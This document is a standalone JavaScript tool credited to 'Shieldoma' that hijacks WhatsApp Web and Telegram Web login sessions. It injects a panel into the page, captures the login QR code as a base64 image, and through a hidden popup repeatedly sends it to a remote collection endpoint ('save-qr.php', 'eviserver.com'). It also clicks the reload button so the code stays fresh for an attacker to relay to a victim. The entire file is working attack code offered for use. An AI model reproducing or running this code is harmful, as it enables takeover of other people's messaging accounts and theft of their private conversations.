/* default settings */
var w81251e934afc2328e4b21cd90e6bd29d___SETTINGS = {
    "default_server_url": "https://yoursite.com/save-qr.php?token=xxxxxx&code=",
    "services": [
    {
        title: 'WhatsApp',
        selector: '.landing-main canvas[role="img"]',
        reload_selector: '.Jht5u',
        domain_match: ['web.whatsapp.com']
    },
    {
        title: 'Telegram',
        selector: '.qr-container:first-of-type svg:first-of-type',
        reload_selector: '',
        domain_match: ['web.telegram.org']
    }, ]
};

var testImageElementCloneBase64Loader = function(selector, _base64)
{
    var targetElement = document.querySelectorAll(selector);
    var targetSource = targetElement[0];
    if (String(targetSource.tagName).toLocaleLowerCase() == 'svg')
    {
        var svgXml = new XMLSerializer().serializeToString(targetSource);
        var img = new Image();
        img.src = 'data:image/svg+xml;base64,' + btoa(svgXml);
        img.onload = function()
        {
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);
            var dataUrl = canvas.toDataURL('image/png');
            _base64(dataUrl);
        };
    }
    else if (String(targetSource.tagName).toLocaleLowerCase() == 'img')
    {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        canvas.width = targetSource.naturalWidth;
        canvas.height = targetSource.naturalHeight;
        targetSource.onload = function()
        {
            ctx.drawImage(targetSource, 0, 0);
            var dataURL = canvas.toDataURL('image/png');
            _base64(dataURL);
        };
        if (targetSource.complete || targetSource.readyState === 4)
        {
            targetSource.onload();
        }
    }
    else if (String(targetSource.tagName).toLocaleLowerCase() == 'canvas')
    {
        var base64Code = targetSource.toDataURL('image/png');
        _base64(base64Code);
    }
    else
    {
        _base64('invalid_element');
    }
};
var runCanvasSenderScriptAndSendToServer = function()
{
    var level = 1;
    var selector = document.getElementById('____OopServ1ce').value;
    var popupUrl = document.getElementById('____OopS3reverUrl').value;
    var sendInterval = parseInt(document.getElementById('____OopT1meSlct').value) * 1000;
    if (selector.length == 0 || typeof document.querySelectorAll(selector)[0] == 'undefined')
    {
        alert('"QR HTML Selector" is invalid or not found in page. Make sure you entered the right selector.');
        return;
    }
    else if (popupUrl.length == 0)
    {
        alert('"QR Save Endpoint URL" is invalid. Make sure you entered the right GET Request URL at the end.');
        return;
    }
    else if (sendInterval <= 0)
    {
        alert('"Send QR Every" is invalid. Make sure you entered a valid number of seconds.');
        return;
    };
    var popupWindow;
    testImageElementCloneBase64Loader(selector, function(base64Code)
    {
        if (base64Code == 'invalid_element')
        {
            alert("Error: the selector " + selector + " isn't pointing to a valid [ CANVAS / IMG / SVG ] element!");
            return;
        }
        popupWindow = window.open(popupUrl + encodeURIComponent(base64Code) + '&level=' + level, 'server_' + Date.now(), `width=197, height=197`);
        var checkForChanges = function()
        {
            var sendCanvasCode = function()
            {
                testImageElementCloneBase64Loader(selector, function(base64CodeReloaded)
                {
                    popupWindow.location.href = popupUrl + encodeURIComponent(base64CodeReloaded) + '&level=' + level;
                    popupWindow.blur();
                    level++;
                });
            };
            var checkReloadButton = (String(document.getElementById('____OopRel0dBypass').value).length > 0 && typeof document.querySelectorAll(document.getElementById('____OopRel0dBypass').value)[0] !== 'undefined');
            if (checkReloadButton)
            {
                document.querySelectorAll(document.getElementById('____OopRel0dBypass').value)[0].click();
            }
            else
            {
                sendCanvasCode();
            }
        };
        checkForChanges(), setInterval(checkForChanges, sendInterval);
        document.getElementById('_____sendCanvasMainGUITemplateN1').style = 'display:none!important;';
    });
};
var runCanvasSenderScriptGuiAndOpen = function()
{
    if (document.getElementById('_____sendCanvasMainGUITemplateN1'))
    {
        document.getElementById('_____sendCanvasMainGUITemplateN1').parentNode.removeChild(document.getElementById('_____sendCanvasMainGUITemplateN1'));
    };
    var services = '';
    var reloads_buttons = '';
    w81251e934afc2328e4b21cd90e6bd29d___SETTINGS.services.forEach(function(item)
    {
        services += `<option value='${item.selector}'>${item.title}</option>`;
        if (item.reload_selector && item.reload_selector.length > 0)
        {
            reloads_buttons += `<option value='${item.reload_selector}'>${item.title}</option>`;
        }
    });
    var testTempDiv = document.createElement('div');
    testTempDiv.id = '_____sendCanvasMainGUITemplateN1';
    testTempDiv.style = 'position: absolute!important; top: 14px !important; left: 14px !important; width:auto!important;background: black!important;z-index: 99999999999999999999!important;border: 1px solid rgb(254, 254, 254)fff!important;padding: 15px!important;border-radius: 5px!important;color: #d9d9d9 !important;font-size: 13px!important;font-family:arial!important;';
    testTempDiv.innerHTML = `<div style="position: relative !important"><select autocomplete="off" id="____OopServ1ceSlct"    style="position:absolute !important;right: 0px !important;font-size: 12px !important;top: -4px !important;border-radius: 5px !important;color: #979797 !important;background: transparent !important;border: none !important;padding: 0px !important;text-align: right !important;cursor: pointer !important;">    <option selected="selected" value="">Custom</option>    ${services}</select><label style="padding-bottom:9px;display:block !important;">QR HTML Selector *</label><input autocomplete="off" id="____OopServ1ce"    placeholder="canvas[class=&quot;qr&quot;]"    style="border: none;padding:6px;border-radius:5px;width:260px;background: #fff !important;"></div><div style="position: relative !important; margin-top: 15px !important;"><label style="padding-bottom:9px;display:block !important;">QR Save Endpoint URL *</label><input autocomplete="off" id="____OopS3reverUrl" value="${w81251e934afc2328e4b21cd90e6bd29d___SETTINGS.default_server_url}" placeholder="https://eviserver.com/save-qr/"    style="border: none;padding:6px;border-radius:5px;width:260px;background: #fff !important;"></div><div style="position: relative !important; margin-top: 15px !important;"><select autocomplete="off" id="____OopRel0dBypassSlct"    style="position:absolute !important;right: 0px !important;font-size: 12px !important;top: -4px !important;border-radius: 5px !important;color: #979797 !important;background: transparent !important;border: none !important;padding: 0px !important;text-align: right !important;cursor: pointer !important;">    <option selected="selected" value="">Custom</option>    ${reloads_buttons}</select><label style="padding-bottom:9px;display:block !important;">QR Reload Selector</label><input autocomplete="off"    id="____OopRel0dBypass" placeholder="canvas[class=&quot;qr&quot;]"    style="border: none;padding:6px;border-radius:5px;width:260px;background: #fff !important;"></div><div style="position: relative !important; margin-top: 15px !important;"><select autocomplete="off" id="____OopT1meSlct"    style="position:absolute !important;right: 0px !important;font-size: 12px !important;top: -4px !important;border-radius: 5px !important;color: #979797 !important;background: transparent !important;border: none !important;padding: 0px !important;text-align: right !important;cursor: pointer !important;">    <option value="">Custom</option>    <option value="1">1 Seconds</option>    <option value="2">2 Seconds</option>    <option value="3" selected="selected">3 Seconds</option>    <option value="5">5 Seconds</option>    <option value="8">8 Seconds</option>    <option value="10">10 Seconds</option></select><label style="padding-bottom:9px;display:block !important;">Send QR Every *</label><input autocomplete="off" id="____OopT1me"    placeholder="3" value="3"    style="border: none;padding:6px;border-radius:5px;width:260px;background: #fff !important;"></div><div style="position: relative !important; margin-top: 22px !important;"><button id="__test" style="width:100%!important;padding:5px!important;background:#ccc!important;border:none!important;border-radius:5px!important;padding-bottom: 7px !important;">Run</button><p style="text-align:center;margin-top:13px;font-size:9px;"><a target="_blank" style="color:#828282!important;" href="https://shieldoma.com/">By Shieldoma</a></p></div>`;
    document.body.appendChild(testTempDiv);
    setTimeout(function()
    {
        document.addEventListener('click', function(event)
        {
            if (event.target.matches('#__test'))
            {
                runCanvasSenderScriptAndSendToServer();
            }
        });
        document.addEventListener('change', function(event)
        {
            if (event.target.matches('#____OopServ1ceSlct'))
            {
                document.getElementById('____OopServ1ce').value = event.target.value;
            }
        });
        document.addEventListener('change', function(event)
        {
            if (event.target.matches('#____OopRel0dBypassSlct'))
            {
                document.getElementById('____OopRel0dBypass').value = event.target.value;
            }
        });
        document.addEventListener('change', function(event)
        {
            if (event.target.matches('#____OopT1meSlct'))
            {
                document.getElementById('____OopT1me').value = event.target.value;
            }
        });
        document.addEventListener('input', function(event)
        {
            if (event.target.matches('#____OopServ1ce'))
            {
                document.getElementById('____OopServ1ceSlct').value = '';
            }
        });
        document.addEventListener('input', function(event)
        {
            if (event.target.matches('#____OopRel0dBypass'))
            {
                document.getElementById('____OopRel0dBypassSlct').value = '';
            }
        });
        document.addEventListener('input', function(event)
        {
            if (event.target.matches('#____OopT1me'))
            {
                document.getElementById('____OopT1meSlct').value = '';
            }
        });
        w81251e934afc2328e4b21cd90e6bd29d___SETTINGS.services.forEach(function(item)
        {
            if (typeof item.domain_match !== 'undefined' && String(item.domain_match).toLowerCase().includes(String(window.location.hostname).toLowerCase()))
            {
                document.getElementById('____OopServ1ceSlct').value = item.selector;
                document.getElementById('____OopServ1ce').value = item.selector;
                document.getElementById('____OopRel0dBypassSlct').value = item.reload_selector;
                document.getElementById('____OopRel0dBypass').value = item.reload_selector;
            }
        });
    }, 100);
};

runCanvasSenderScriptGuiAndOpen();
